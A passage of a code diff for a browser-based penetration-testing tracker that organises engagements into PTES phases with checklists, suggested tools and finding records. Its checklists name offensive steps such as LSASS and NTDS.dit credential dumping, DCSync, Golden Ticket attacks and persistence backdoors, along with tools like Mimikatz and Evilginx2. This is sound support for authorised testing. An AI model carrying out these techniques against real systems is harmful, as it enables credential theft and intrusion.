+    <div class="sim-sidebar" id="sim-sidebar">
+      <h4>Discovered Assets</h4>
+      <div id="sim-assets"></div>
+      <h4>Findings</h4>
+      <div id="sim-findings"></div>
+      <h4>Vulnerabilities</h4>
+      <div id="sim-vulns"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+/* ============================================================
+   STORAGE MODULE
+   ============================================================ */
+const Storage = {
+  KEY: 'armyofone_project',
+
+  save(data) {
+    try {
+      localStorage.setItem(this.KEY, JSON.stringify(data));
+    } catch (e) {
+      console.error('Storage save error:', e);
+      UI.toast('Failed to save data', 'error');
+    }
+  },
+
+  load() {
+    try {
+      const raw = localStorage.getItem(this.KEY);
+      return raw ? JSON.parse(raw) : null;
+    } catch (e) {
+      console.error('Storage load error:', e);
+      return null;
+    }
+  },
+
+  clear() {
+    localStorage.removeItem(this.KEY);
+  }
+};
+
+/* ============================================================
+   CHECKLIST DATA — per engagement type
+   ============================================================ */
+const ChecklistData = {
+  // Returns checklists for each PTES phase based on engagement config
+  getChecklists(engagementType) {
+    const { testType, knowledgeLevel, scenario } = engagementType;
+    const phases = {};
+
+    // Phase 1: Pre-Engagement
+    phases.phase1 = [
+      'Confirm scope and boundaries',
+      'Obtain written authorization / rules of engagement',
+      'Identify emergency contacts',
+      'Confirm testing window and schedule',
+      'Define communication channels',
+      'Clarify out-of-scope systems',
+      'Review legal agreements / NDA',
+      'Set up secure note-taking and evidence collection',
+    ];
+
+    // Phase 2: Intelligence Gathering
+    const igBase = [];
+    if (knowledgeLevel === 'blackbox') {
+      igBase.push('Passive DNS enumeration', 'WHOIS lookups', 'Subdomain discovery', 'Search engine dorking', 'Social media reconnaissance', 'Technology fingerprinting', 'Email harvesting', 'Certificate transparency log review');
+    }
+    if (knowledgeLevel === 'greybox') {
+      igBase.push('Review provided documentation', 'Validate provided credentials', 'Map known endpoints and services', 'Identify additional subdomains/hosts', 'Technology stack verification');
+    }
+    if (knowledgeLevel === 'whitebox') {
+      igBase.push('Review source code repository', 'Analyze architecture diagrams', 'Review network diagrams', 'Examine configuration files', 'Identify third-party dependencies', 'Review deployment documentation');
+    }
+
+    if (testType === 'webapp') {
+      igBase.push('Spider/crawl the application', 'Identify all entry points and forms', 'Map authentication mechanisms', 'Identify API endpoints', 'Review robots.txt and sitemap.xml');
+    } else if (testType === 'api') {
+      igBase.push('Obtain API documentation / OpenAPI spec', 'Enumerate API endpoints', 'Identify authentication mechanisms (OAuth, JWT, API keys)', 'Map API versioning', 'Identify rate limiting behavior');
+    } else if (testType === 'infrastructure') {
+      igBase.push('Port scanning (TCP/UDP)', 'Service enumeration and banner grabbing', 'OS fingerprinting', 'Network topology mapping', 'Identify live hosts (ping sweep, ARP scan)');
+    }
+
+    if (scenario === 'm365') {
+      igBase.push('Enumerate Entra ID tenant info', 'Identify federated domains', 'Enumerate users via Teams/OneDrive', 'Check for guest access policies', 'Identify OAuth applications');
+    } else if (scenario === 'assume_breach') {
+      igBase.push('Enumerate Active Directory (users, groups, OUs)', 'Identify domain controllers', 'Map trust relationships', 'Enumerate GPOs', 'Identify service accounts', 'Run BloodHound collection');
+    } else if (scenario === 'enterprise_wide') {
+      igBase.push('Map all business units and subsidiaries', 'Identify external-facing assets across the org', 'Enumerate cloud services (AWS, Azure, GCP)', 'Identify wireless networks', 'Map physical locations');
+    }
+    phases.phase2 = igBase;
+
+    // Phase 3: Threat Modeling
+    const tmBase = ['Map the attack surface', 'Identify high-value targets / crown jewels', 'Prioritize attack vectors'];
+    if (testType === 'webapp') tmBase.push('Map user roles and privilege levels', 'Identify sensitive data flows', 'Review CORS and CSP configuration', 'Identify file upload functionality');
+    if (testType === 'api') tmBase.push('Map API authentication flows', 'Identify object-level access points (BOLA/IDOR)', 'Review data exposure in responses', 'Identify mass assignment risks');
+    if (testType === 'infrastructure') tmBase.push('Identify network segmentation boundaries', 'Map critical services (DC, DNS, DHCP, CA)', 'Identify legacy systems / EOL software', 'Assess patch management posture');
+    if (scenario === 'assume_breach') tmBase.push('Identify paths to Domain Admin', 'Map Kerberoastable accounts', 'Identify AS-REP roastable accounts', 'Map delegation configurations', 'Identify certificate abuse paths (ADCS)');
+    if (scenario === 'm365') tmBase.push('Review Conditional Access policies', 'Identify MFA gaps', 'Map application consent permissions', 'Identify mail flow rules', 'Review external sharing settings');
+    if (scenario === 'enterprise_wide') tmBase.push('Identify cross-segment attack paths', 'Map cloud-to-on-prem bridges', 'Identify phishing targets', 'Assess physical security posture');
+    phases.phase3 = tmBase;
+
+    // Phase 4: Vulnerability Analysis
+    const vaBase = ['Run automated vulnerability scanner', 'Validate scanner findings manually', 'Check for default credentials', 'Review for misconfigurations'];
+    if (testType === 'webapp') vaBase.push('Test for SQL injection', 'Test for XSS (reflected, stored, DOM)', 'Test for CSRF', 'Test for SSRF', 'Test for insecure deserialization', 'Test for path traversal / LFI / RFI', 'Test for broken access controls', 'Test for authentication bypass', 'Review session management', 'Test file upload restrictions', 'Check security headers');
+    if (testType === 'api') vaBase.push('Test for BOLA/IDOR', 'Test for broken authentication', 'Test for excessive data exposure', 'Test for mass assignment', 'Test for injection (SQL, NoSQL, command)', 'Test for SSRF via API parameters', 'Test rate limiting and throttling', 'Test for improper input validation', 'Fuzz API parameters');
+    if (testType === 'infrastructure') vaBase.push('Check for missing patches (CVEs)', 'Test for SMB signing issues', 'Check LLMNR/NBT-NS/mDNS poisoning', 'Test for SNMP misconfigurations', 'Check for open NFS/SMB shares', 'Test SSH/RDP configurations', 'Check for cleartext protocols (FTP, Telnet, HTTP)');
+    if (scenario === 'assume_breach') vaBase.push('Test for Kerberoasting', 'Test for AS-REP roasting', 'Check for unconstrained delegation', 'Test for ADCS misconfigurations (ESC1-ESC8)', 'Check for LAPS bypass', 'Test for GPP passwords', 'Check for NTLM relay opportunities');
+    if (scenario === 'm365') vaBase.push('Test for token theft / replay', 'Test for OAuth consent phishing', 'Check for overly permissive app registrations', 'Test for mailbox rule abuse', 'Check for SharePoint/OneDrive exposure', 'Test eDiscovery access', 'Check for Power Automate abuse');
+    if (scenario === 'enterprise_wide') vaBase.push('Test for cross-VLAN access', 'Check wireless security (WPA2/WPA3)', 'Test VPN configurations', 'Test for cloud misconfigurations (S3, blob, etc.)', 'Check for CI/CD pipeline weaknesses');
+    phases.phase4 = vaBase;
+
+    // Phase 5: Exploitation
+    const exBase = ['Document all exploit attempts (success and failure)', 'Capture evidence / screenshots for each finding', 'Record credentials obtained'];
+    if (testType === 'webapp') exBase.push('Exploit injection vulnerabilities', 'Exploit authentication bypasses', 'Exploit access control flaws', 'Chain vulnerabilities for greater impact', 'Exploit file upload for RCE', 'Exploit SSRF for internal access');
+    if (testType === 'api') exBase.push('Exploit BOLA/IDOR for data access', 'Exploit authentication flaws', 'Exploit mass assignment', 'Chain API vulnerabilities', 'Exploit SSRF via API', 'Demonstrate data exfiltration via API');
+    if (testType === 'infrastructure') exBase.push('Exploit vulnerable services for initial access', 'Exploit password spraying / credential stuffing', 'Exploit LLMNR/NBT-NS poisoning (Responder)', 'Exploit SMB relay attacks', 'Exploit known CVEs on identified services');
+    if (scenario === 'assume_breach') exBase.push('Perform Kerberoasting and crack hashes', 'Exploit unconstrained delegation', 'Exploit ADCS misconfigurations', 'Perform DCSync attack', 'Exploit trust relationships', 'Perform Golden/Silver Ticket attacks');
+    if (scenario === 'm365') exBase.push('Demonstrate OAuth token abuse', 'Exploit consent grant attack', 'Demonstrate mailbox rule persistence', 'Access sensitive SharePoint/Teams data', 'Exploit Power Automate / Logic Apps');
+    if (scenario === 'enterprise_wide') exBase.push('Demonstrate attack chain across segments', 'Exploit cloud-to-on-prem pivoting', 'Demonstrate phishing for initial access', 'Exploit wireless for network access', 'Chain multiple findings for business impact');
+    phases.phase5 = exBase;
+
+    // Phase 6: Post-Exploitation
+    const peBase = ['Assess the impact of each compromise', 'Document all accessed data / systems'];
+    if (testType === 'webapp') peBase.push('Assess data access (PII, financial, credentials)', 'Test for privilege escalation within the app', 'Identify sensitive data in databases', 'Test for server-side access from the app');
+    if (testType === 'api') peBase.push('Assess data exposure scope', 'Identify accessible downstream systems', 'Test for privilege escalation via API', 'Document accessible PII / sensitive data');
+    if (testType === 'infrastructure') peBase.push('Dump credentials (SAM, LSASS, cached)', 'Test lateral movement to other hosts', 'Escalate privileges (local and domain)', 'Access sensitive files and shares', 'Test persistence mechanisms');
+    if (scenario === 'assume_breach') peBase.push('Achieve Domain Admin (if possible)', 'Access domain controller', 'Dump NTDS.dit or perform DCSync', 'Identify and access crown jewels', 'Test data exfiltration paths', 'Establish persistence (scheduled tasks, services, backdoors)', 'Test detection / alerting capabilities');
+    if (scenario === 'm365') peBase.push('Access other users\' mailboxes', 'Extract sensitive documents from SharePoint/OneDrive', 'Enumerate and access Teams channels', 'Test for cross-tenant access', 'Demonstrate persistent access via OAuth apps');
+    if (scenario === 'enterprise_wide') peBase.push('Map full extent of compromise', 'Demonstrate business impact scenarios', 'Test detection coverage across segments', 'Identify gaps in monitoring/alerting', 'Test incident response capability');
+    phases.phase6 = peBase;
+
+    // Phase 7: Reporting
+    phases.phase7 = [
+      'Write executive summary',
+      'Document all findings with evidence',
+      'Assign severity ratings (CVSS) to each vulnerability',
+      'Provide remediation recommendations',
+      'Include attack narrative / kill chain',
+      'Document tools and techniques used',
+      'Create risk matrix / heat map',
+      'Prepare technical appendix',
+      'Conduct client debrief / readout',
+      'Deliver final report',
+      'Clean up: remove tools, backdoors, and test accounts',
+      'Verify cleanup completion',
+    ];
+
+    return phases;
+  },
+
+  getTools(engagementType) {
+    const { testType, scenario } = engagementType;
+    const tools = {};
+
+    tools.phase1 = [];
+    tools.phase2 = [];
+    tools.phase3 = [];
+    tools.phase4 = [];
+    tools.phase5 = [];
+    tools.phase6 = [];
+    tools.phase7 = [];
+
+    if (testType === 'webapp') {
+      tools.phase2.push('Burp Suite', 'wfuzz', 'ffuf', 'Wappalyzer', 'Amass', 'subfinder', 'httpx');
+      tools.phase4.push('Burp Suite Scanner', 'SQLMap', 'Nikto', 'Nuclei', 'OWASP ZAP');
+      tools.phase5.push('Burp Suite Repeater/Intruder', 'SQLMap', 'XSStrike', 'Commix');
+    } else if (testType === 'api') {
+      tools.phase2.push('Postman', 'Swagger UI', 'ffuf', 'Arjun', 'Kiterunner');
+      tools.phase4.push('Burp Suite', 'Nuclei', 'OWASP ZAP', 'Postman', 'jwt_tool');
+      tools.phase5.push('Burp Suite', 'Postman', 'curl', 'jwt_tool', 'SQLMap');
+    } else if (testType === 'infrastructure') {
+      tools.phase2.push('Nmap', 'Masscan', 'Shodan', 'Censys', 'enum4linux-ng', 'CrackMapExec/NetExec');
+      tools.phase4.push('Nessus', 'OpenVAS', 'Nmap NSE', 'Nuclei', 'CrackMapExec/NetExec');
+      tools.phase5.push('Metasploit', 'CrackMapExec/NetExec', 'Responder', 'ntlmrelayx', 'Impacket');
+      tools.phase6.push('Mimikatz', 'SharpHound', 'Impacket', 'Rubeus', 'CrackMapExec/NetExec');
+    }
+
+    if (scenario === 'assume_breach') {
+      tools.phase2.push('BloodHound', 'SharpHound', 'ADRecon', 'PowerView', 'PingCastle');
+      tools.phase4.push('Rubeus', 'Certify', 'StandIn', 'Whisker');
+      tools.phase5.push('Rubeus', 'Certify', 'KrbRelayUp', 'Impacket', 'Covenant/Sliver');
+      tools.phase6.push('Mimikatz', 'SharpDPAPI', 'Seatbelt', 'SharpUp', 'LaZagne');
+    }
+
+    if (scenario === 'm365') {
+      tools.phase2.push('AADInternals', 'ROADtools', 'AzureHound', 'MSOLSpray', 'o365creeper');
+      tools.phase4.push('ROADtools', 'TokenTactics', 'GraphRunner', 'Azurite');
+      tools.phase5.push('TokenTactics', 'GraphRunner', 'AADInternals', 'Mailsniper');
+      tools.phase6.push('GraphRunner', 'AADInternals', 'ROADtools');
+    }
+
+    if (scenario === 'enterprise_wide') {
+      tools.phase2.push('Amass', 'Nmap', 'Shodan', 'cloud_enum', 'ScoutSuite');
+      tools.phase4.push('Nessus', 'Burp Suite', 'BloodHound', 'ScoutSuite', 'Prowler');
+      tools.phase5.push('Metasploit', 'Cobalt Strike/Sliver', 'Gophish', 'Evilginx2');
+    }
+
+    tools.phase7.push('Ghostwriter', 'SysReptor', 'PlexTrac', 'Serpico', 'Pandoc');
+
+    // Deduplicate
+    for (const k in tools) { tools[k] = [...new Set(tools[k])]; }
+    return tools;
+  }
+};
+
+/* ============================================================
+   PHASE METADATA
+   ============================================================ */
+const PhaseInfo = [
+  { id: 'phase1', num: 1, name: 'Pre-Engagement', description: 'Define scope, rules of engagement, contacts, and authorization.' },
+  { id: 'phase2', num: 2, name: 'Intelligence Gathering', description: 'Collect information about the target — OSINT, enumeration, and asset discovery.' },
+  { id: 'phase3', num: 3, name: 'Threat Modeling', description: 'Map the attack surface, identify threats, and prioritize attack vectors.' },
+  { id: 'phase4', num: 4, name: 'Vulnerability Analysis', description: 'Identify and validate vulnerabilities through scanning and manual testing.' },
+  { id: 'phase5', num: 5, name: 'Exploitation', description: 'Attempt to exploit identified vulnerabilities and document results.' },
+  { id: 'phase6', num: 6, name: 'Post-Exploitation', description: 'Assess impact — credential harvesting, lateral movement, data access, persistence.' },
+  { id: 'phase7', num: 7, name: 'Reporting', description: 'Document findings, assign risk ratings, provide remediation recommendations.' },
+];
+
+/* ============================================================
+   UI MODULE
+   ============================================================ */
+const UI = {
+  toast(message, type = 'success') {
+    const el = document.getElementById('toast');
+    el.textContent = message;
+    el.className = 'toast ' + type;
+    requestAnimationFrame(() => el.classList.add('visible'));
+    setTimeout(() => el.classList.remove('visible'), 3000);
+  },
+
+  openModal(title, bodyHTML, footerHTML) {
+    document.getElementById('modal-title').textContent = title;
+    document.getElementById('modal-body').innerHTML = bodyHTML;
+    document.getElementById('modal-footer').innerHTML = footerHTML || '';
+    document.getElementById('modal-overlay').classList.add('visible');
+  },
+
+  closeModal() {
+    document.getElementById('modal-overlay').classList.remove('visible');
+  },
+
+  escapeHTML(str) {
+    const div = document.createElement('div');
+    div.textContent = str || '';
+    return div.innerHTML;
+  },
+
+  generateId() {
+    return Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
+  }
+};
+
+/* ============================================================
+   APP MODULE
+   ============================================================ */
+const App = {
+  project: null,
+  currentPhase: 'phase1',
+
+  init() {
+    const saved = Storage.load();
+    if (saved) {
+      this.project = saved;
+      this.showApp();
+    } else {
+      Wizard.init();
+    }
+
+    // Modal close on overlay click
+    document.getElementById('modal-overlay').addEventListener('click', (e) => {
+      if (e.target === e.currentTarget) UI.closeModal();
+    });
+
+    // Keyboard: Escape to close modal or console view
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape') {
+        const simOverlay = document.getElementById('sim-overlay');
+        if (simOverlay.classList.contains('visible') && simOverlay.classList.contains('replay')) {
+          ConsoleView.close();
+        } else if (simOverlay.classList.contains('visible')) {
+          // Don't close live simulation with Escape — use Stop button
+        } else {
+          UI.closeModal();
+        }
+      }
+    });
+
+    // File import handler
+    document.getElementById('file-import').addEventListener('change', (e) => {
+      const file = e.target.files[0];
+      if (!file) return;
+      const reader = new FileReader();
+      reader.onload = (ev) => {
+        try {
+          const data = JSON.parse(ev.target.result);
+          if (!data.project || !data.engagementType) throw new Error('Invalid format');
+          App.project = data;
+          Storage.save(data);
+          App.showApp();
+          UI.toast('Project imported successfully');
+        } catch (err) {
+          UI.toast('Invalid project file: ' + err.message, 'error');
+        }
+      };
+      reader.readAsText(file);
+      e.target.value = '';
+    });
+  },
+
+  showApp() {
+    document.getElementById('wizard-container').classList.add('hidden');
+    document.getElementById('app').classList.remove('hidden');
+    this.renderSidebar();
+    this.navigateToPhase(this.currentPhase);
+  },
+
+  renderSidebar() {
+    const p = this.project;
+    document.getElementById('sidebar-project-name').textContent = p.project.name || 'Untitled Project';
+
+    const labels = {
+      webapp: 'Web App', api: 'API', infrastructure: 'Infra',
+      blackbox: 'Black Box', greybox: 'Grey Box', whitebox: 'White Box',
+      standard: '', assume_breach: 'Assume Breach', m365: 'M365', enterprise_wide: 'Enterprise'
+    };
+    const parts = [labels[p.engagementType.testType], labels[p.engagementType.knowledgeLevel]];
+    if (p.engagementType.scenario !== 'standard') parts.push(labels[p.engagementType.scenario]);
+    document.getElementById('sidebar-badge').textContent = parts.join(' / ');
+
+    const nav = document.getElementById('phase-nav');
+    nav.innerHTML = '';
+    PhaseInfo.forEach(phase => {
+      const progress = this.getPhaseProgress(phase.id);
+      const btn = document.createElement('button');
+      btn.className = 'phase-nav-item' +
+        (phase.id === this.currentPhase ? ' active' : '') +
+        (progress === 100 ? ' completed' : '');
+      btn.innerHTML = `
+        <span class="phase-num">${progress === 100 ? '&#10003;' : phase.num}</span>
+        <span class="phase-label">${phase.name}</span>
+        <span class="phase-progress">${progress}%</span>
+      `;
+      btn.addEventListener('click', () => this.navigateToPhase(phase.id));
+      nav.appendChild(btn);
+    });
+
+    // Show/hide console button based on whether console log exists
+    const consoleBtn = document.getElementById('btn-view-console');
+    if (consoleBtn) {
+      consoleBtn.style.display = (p.consoleLog && p.consoleLog.terminalHTML) ? '' : 'none';
+    }
+  },
+
+  getPhaseProgress(phaseId) {
+    const prog = this.project.progress[phaseId];
+    if (!prog || !prog.checklist || prog.checklist.length === 0) return 0;
+    const done = prog.checklist.filter(c => c.done).length;
+    return Math.round((done / prog.checklist.length) * 100);
+  },
+
+  getOverallProgress() {
+    let total = 0, done = 0;
+    PhaseInfo.forEach(p => {
+      const prog = this.project.progress[p.id];
+      if (prog && prog.checklist) {
+        total += prog.checklist.length;
+        done += prog.checklist.filter(c => c.done).length;
+      }
+    });
+    return total === 0 ? 0 : Math.round((done / total) * 100);
+  },
+
+  navigateToPhase(phaseId) {
+    this.currentPhase = phaseId;
+    this.renderSidebar();
+    const phase = PhaseInfo.find(p => p.id === phaseId);
+    document.getElementById('phase-title').textContent = `Phase ${phase.num}: ${phase.name}`;
+    document.getElementById('phase-description').textContent = phase.description;
+
+    // Progress bar
+    const overall = this.getOverallProgress();
+    document.getElementById('progress-fill').style.width = overall + '%';
+    document.getElementById('progress-text').textContent = `Overall Progress: ${overall}%`;
+
+    // Phase action buttons
+    const actions = document.getElementById('phase-actions');
+    actions.innerHTML = `
+      <button class="btn btn-sm" onclick="App.showAddAsset()">+ Asset</button>
+      <button class="btn btn-sm" onclick="App.showAddFinding()">+ Finding</button>
+      <button class="btn btn-sm" onclick="App.showAddVuln()">+ Vulnerability</button>
+    `;
+
+    this.renderPhaseContent(phaseId);
+  },
+
+  renderPhaseContent(phaseId) {
+    const body = document.getElementById('main-body');
+    const tools = ChecklistData.getTools(this.project.engagementType);
+    const phaseTools = tools[phaseId] || [];
+
+    let html = '';
+
+    // Tabs
+    html += `<div class="tabs">
+      <button class="tab-btn active" onclick="App.switchTab(this, 'tab-checklist')">Checklist</button>
+      <button class="tab-btn" onclick="App.switchTab(this, 'tab-assets')">Assets</button>
+      <button class="tab-btn" onclick="App.switchTab(this, 'tab-findings')">Findings</button>
+      <button class="tab-btn" onclick="App.switchTab(this, 'tab-vulns')">Vulnerabilities</button>
+      <button class="tab-btn" onclick="App.switchTab(this, 'tab-notes')">Notes</button>
+    </div>`;
+
+    // TAB: Checklist
+    html += `<div class="tab-content active" id="tab-checklist">`;
+    if (phaseTools.length > 0) {
+      html += `<div class="card"><div class="card-header"><h3>Suggested Tools</h3></div><div class="tool-chips">`;
+      phaseTools.forEach(t => { html += `<span class="tool-chip">${UI.escapeHTML(t)}</span>`; });
+      html += `</div></div>`;
+    }
+    html += `<div class="card"><div class="card-header"><h3>Tasks</h3><span class="text-sm text-muted">${this.getPhaseProgress(phaseId)}% complete</span></div>`;
+    html += `<ul class="checklist">`;
+    const prog = this.project.progress[phaseId];
+    if (prog && prog.checklist) {
+      prog.checklist.forEach((item, i) => {
+        html += `<li class="checklist-item${item.done ? ' done' : ''}">
+          <input type="checkbox" id="chk-${i}" ${item.done ? 'checked' : ''} onchange="App.toggleChecklist('${phaseId}', ${i})">
+          <label for="chk-${i}">${UI.escapeHTML(item.item)}</label>
+        </li>`;
+      });
+    }
+    html += `</ul></div></div>`;
+
+    // TAB: Assets
+    html += `<div class="tab-content" id="tab-assets">`;
+    const phaseAssets = (this.project.assets || []).filter(a => a.phase === phaseId);
+    const allAssets = this.project.assets || [];
+    if (allAssets.length === 0) {
+      html += `<div class="empty-state"><span class="empty-icon">&#128269;</span><p>No assets discovered yet.</p>
+        <button class="btn btn-primary btn-sm" onclick="App.showAddAsset()">+ Add Asset</button></div>`;
+    } else {
+      html += `<div class="card"><div class="card-header"><h3>Assets (Phase)</h3><span class="text-sm text-muted">${phaseAssets.length} in this phase / ${allAssets.length} total</span></div>`;
+      html += this.renderAssetTable(phaseAssets.length > 0 ? phaseAssets : allAssets, phaseAssets.length === 0);
+      html += `</div>`;
+    }
+    html += `</div>`;
+
+    // TAB: Findings
+    html += `<div class="tab-content" id="tab-findings">`;
+    const phaseFindings = (this.project.findings || []).filter(f => f.phase === phaseId);
+    const allFindings = this.project.findings || [];
+    if (allFindings.length === 0) {
+      html += `<div class="empty-state"><span class="empty-icon">&#128270;</span><p>No findings recorded yet.</p>
+        <button class="btn btn-primary btn-sm" onclick="App.showAddFinding()">+ Add Finding</button></div>`;
+    } else {
+      html += `<div class="card"><div class="card-header"><h3>Findings (Phase)</h3><span class="text-sm text-muted">${phaseFindings.length} in this phase / ${allFindings.length} total</span></div>`;
+      html += this.renderFindingsTable(phaseFindings.length > 0 ? phaseFindings : allFindings, phaseFindings.length === 0);
+      html += `</div>`;
+    }
+    html += `</div>`;
+
+    // TAB: Vulnerabilities
+    html += `<div class="tab-content" id="tab-vulns">`;
+    const phaseVulns = (this.project.vulnerabilities || []).filter(v => v.phase === phaseId);
+    const allVulns = this.project.vulnerabilities || [];
+    if (allVulns.length === 0) {
+      html += `<div class="empty-state"><span class="empty-icon">&#128027;</span><p>No vulnerabilities documented yet.</p>
+        <button class="btn btn-primary btn-sm" onclick="App.showAddVuln()">+ Add Vulnerability</button></div>`;
+    } else {
+      html += `<div class="card"><div class="card-header"><h3>Vulnerabilities (Phase)</h3><span class="text-sm text-muted">${phaseVulns.length} in this phase / ${allVulns.length} total</span></div>`;
+      html += this.renderVulnsTable(phaseVulns.length > 0 ? phaseVulns : allVulns, phaseVulns.length === 0);
+      html += `</div>`;
+    }
+    html += `</div>`;
+
+    // TAB: Notes
+    html += `<div class="tab-content" id="tab-notes">`;
+    html += `<div class="card"><div class="card-header"><h3>Phase Notes</h3></div>
+      <textarea class="form-control" id="phase-notes" rows="12" placeholder="Write notes, paste output, track progress..."
+        onblur="App.saveNotes('${phaseId}')">${UI.escapeHTML(prog ? prog.notes || '' : '')}</textarea></div>`;
+    html += `</div>`;
+
+    body.innerHTML = html;
+  },
+
+  switchTab(btn, tabId) {
+    btn.closest('.tabs').querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+    document.getElementById(tabId).classList.add('active');
+  },
+
+  toggleChecklist(phaseId, index) {
+    const item = this.project.progress[phaseId].checklist[index];
+    item.done = !item.done;
+    this.save();
+    this.renderSidebar();
+    // Update progress text in phase
+    const overall = this.getOverallProgress();
+    document.getElementById('progress-fill').style.width = overall + '%';
+    document.getElementById('progress-text').textContent = `Overall Progress: ${overall}%`;
+    // Update card header
+    const cardHeader = document.querySelector('#tab-checklist .card-header .text-muted');
+    if (cardHeader) cardHeader.textContent = this.getPhaseProgress(phaseId) + '% complete';
+    // Update checklist item style
+    const li = document.querySelector(`#chk-${index}`).closest('.checklist-item');
+    li.classList.toggle('done', item.done);
+  },
+
+  saveNotes(phaseId) {
+    const el = document.getElementById('phase-notes');
+    if (el) {
+      this.project.progress[phaseId].notes = el.value;
+      this.save();
+    }
+  },
+
+  // ---- Asset rendering ----
+  renderAssetTable(assets, showAllLabel) {
+    if (assets.length === 0) return '<p class="text-muted text-sm">No assets in this phase.</p>';
+    let html = `${showAllLabel ? '<p class="text-sm text-muted mb-16">Showing all assets (none specific to this phase).</p>' : ''}
+    <table class="data-table"><thead><tr>
+      <th>Type</th><th>Value</th><th>Notes</th><th>Phase</th><th>Actions</th>
+    </tr></thead><tbody>`;
+    assets.forEach(a => {
+      html += `<tr>
+        <td><span class="severity severity-info">${UI.escapeHTML(a.type)}</span></td>
+        <td style="font-family:var(--font-mono);font-size:12px;">${UI.escapeHTML(a.value)}</td>
+        <td class="text-sm">${UI.escapeHTML(a.notes || '')}</td>
+        <td class="text-sm text-muted">${a.phase ? a.phase.replace('phase','P') : ''}</td>
+        <td class="actions">
+          <button class="btn btn-sm" onclick="App.editAsset('${a.id}')">Edit</button>
+          <button class="btn btn-sm btn-danger" onclick="App.deleteAsset('${a.id}')">Del</button>
+        </td>
+      </tr>`;
+    });
+    html += `</tbody></table>`;
+    return html;
+  },
+
+  // ---- Findings rendering ----
+  renderFindingsTable(findings, showAllLabel) {
+    if (findings.length === 0) return '<p class="text-muted text-sm">No findings in this phase.</p>';
+    let html = `${showAllLabel ? '<p class="text-sm text-muted mb-16">Showing all findings (none specific to this phase).</p>' : ''}
+    <table class="data-table"><thead><tr>
+      <th>Severity</th><th>Title</th><th>Description</th><th>Phase</th><th>Actions</th>
+    </tr></thead><tbody>`;
+    findings.forEach(f => {
+      html += `<tr>
+        <td><span class="severity severity-${f.severity}">${UI.escapeHTML(f.severity)}</span></td>
+        <td><strong>${UI.escapeHTML(f.title)}</strong></td>
+        <td class="text-sm">${UI.escapeHTML((f.description || '').substring(0, 100))}${(f.description || '').length > 100 ? '...' : ''}</td>
+        <td class="text-sm text-muted">${f.phase ? f.phase.replace('phase','P') : ''}</td>
+        <td class="actions">
+          <button class="btn btn-sm" onclick="App.viewFinding('${f.id}')">View</button>
+          <button class="btn btn-sm" onclick="App.editFinding('${f.id}')">Edit</button>
+          <button class="btn btn-sm btn-danger" onclick="App.deleteFinding('${f.id}')">Del</button>
+        </td>
+      </tr>`;
+    });
+    html += `</tbody></table>`;
+    return html;
+  },
+
+  // ---- Vulnerabilities rendering ----
+  renderVulnsTable(vulns, showAllLabel) {
+    if (vulns.length === 0) return '<p class="text-muted text-sm">No vulnerabilities in this phase.</p>';
+    let html = `${showAllLabel ? '<p class="text-sm text-muted mb-16">Showing all vulnerabilities (none specific to this phase).</p>' : ''}
+    <table class="data-table"><thead><tr>
+      <th>Severity</th><th>CVSS</th><th>Title</th><th>Remediation</th><th>Phase</th><th>Actions</th>
+    </tr></thead><tbody>`;
+    vulns.forEach(v => {
+      html += `<tr>
+        <td><span class="severity severity-${v.severity}">${UI.escapeHTML(v.severity)}</span></td>
+        <td style="font-family:var(--font-mono)">${v.cvss !== undefined && v.cvss !== '' ? v.cvss : '-'}</td>
+        <td><strong>${UI.escapeHTML(v.title)}</strong></td>
+        <td class="text-sm">${UI.escapeHTML((v.remediation || '').substring(0, 80))}${(v.remediation || '').length > 80 ? '...' : ''}</td>
+        <td class="text-sm text-muted">${v.phase ? v.phase.replace('phase','P') : ''}</td>
+        <td class="actions">
+          <button class="btn btn-sm" onclick="App.viewVuln('${v.id}')">View</button>
+          <button class="btn btn-sm" onclick="App.editVuln('${v.id}')">Edit</button>
+          <button class="btn btn-sm btn-danger" onclick="App.deleteVuln('${v.id}')">Del</button>
+        </td>
+      </tr>`;
+    });
+    html += `</tbody></table>`;
+    return html;
+  },
+
+  // ---- CRUD: Assets ----
+  showAddAsset(existing) {
+    const a = existing || {};
+    const assetTypes = this.getAssetTypes();
+    const typeOptions = assetTypes.map(t => `<option value="${t}" ${a.type === t ? 'selected' : ''}>${t}</option>`).join('');
+    const phaseOptions = PhaseInfo.map(p => `<option value="${p.id}" ${(a.phase || this.currentPhase) === p.id ? 'selected' : ''}>${p.name}</option>`).join('');
+
+    const bodyHTML = `
+      <div class="form-row">
+        <div class="form-group">
+          <label>Type</label>
+          <select class="form-control" id="asset-type">${typeOptions}</select>
+        </div>
+        <div class="form-group">
+          <label>Phase</label>
+          <select class="form-control" id="asset-phase">${phaseOptions}</select>
+        </div>
+      </div>
+      <div class="form-group">
+        <label>Value</label>
+        <input type="text" class="form-control" id="asset-value" placeholder="e.g. 192.168.1.1, example.com, admin:password" value="${UI.escapeHTML(a.value || '')}">
+      </div>
+      <div class="form-group">
+        <label>Notes</label>
+        <textarea class="form-control" id="asset-notes" placeholder="Additional details...">${UI.escapeHTML(a.notes || '')}</textarea>
+      </div>`;
+
+    const footer = `
+      <button class="btn" onclick="UI.closeModal()">Cancel</button>
+      <button class="btn btn-primary" onclick="App.saveAsset('${a.id || ''}')">${a.id ? 'Update' : 'Add'} Asset</button>`;
+
+    UI.openModal(a.id ? 'Edit Asset' : 'Add Asset', bodyHTML, footer);
+  },
+
+  getAssetTypes() {
+    const base = ['ip', 'domain', 'host', 'service', 'credential', 'url'];
+    const { testType, scenario } = this.project.engagementType;
+    if (testType === 'webapp') base.push('endpoint', 'parameter', 'cookie');
+    if (testType === 'api') base.push('endpoint', 'api-key', 'token');
+    if (scenario === 'm365') base.push('user', 'tenant', 'app', 'mailbox');
+    if (scenario === 'assume_breach') base.push('user', 'computer', 'group', 'gpo', 'share');
+    if (scenario === 'enterprise_wide') base.push('user', 'subnet', 'cloud-resource');
+    return [...new Set(base)];
+  },
+
+  saveAsset(existingId) {
+    const asset = {
+      id: existingId || UI.generateId(),
+      type: document.getElementById('asset-type').value,
+      value: document.getElementById('asset-value').value.trim(),
+      notes: document.getElementById('asset-notes').value.trim(),
+      phase: document.getElementById('asset-phase').value,
+    };
+    if (!asset.value) { UI.toast('Value is required', 'error'); return; }
+
+    if (existingId) {
+      const idx = this.project.assets.findIndex(a => a.id === existingId);
